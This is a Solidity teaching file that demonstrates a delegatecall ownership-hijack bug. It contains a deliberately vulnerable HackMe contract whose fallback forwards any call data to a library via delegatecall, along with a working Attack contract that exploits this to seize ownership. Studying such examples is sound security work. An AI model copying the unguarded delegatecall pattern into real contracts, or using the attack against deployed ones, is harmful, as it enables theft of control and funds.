// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

/*
HackMe is a contract that uses delegatecall to execute code.
It is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let's see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of Lib using the context of HackMe.
Therefore HackMe's storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/

// THIS CONTRACT CONTAINS A BUG - DO NOT USE
contract HackMe {
    address public owner;
    Lib public lib;

    constructor(address _libAddress) {
        owner = msg.sender;
        lib = Lib(_libAddress);
    }

    fallback() external payable {
        address(lib).delegatecall(msg.data);
    }
}

contract Lib {
    address public owner;

    function pwn() public {
        owner = msg.sender;
    }
}

contract Attack {
    address public hackme;

    constructor(address _hackMeAddress) {
        hackme = _hackMeAddress;
    }

    function attack() public {
        hackme.call(abi.encodeWithSignature("pwn()"));
    }
}

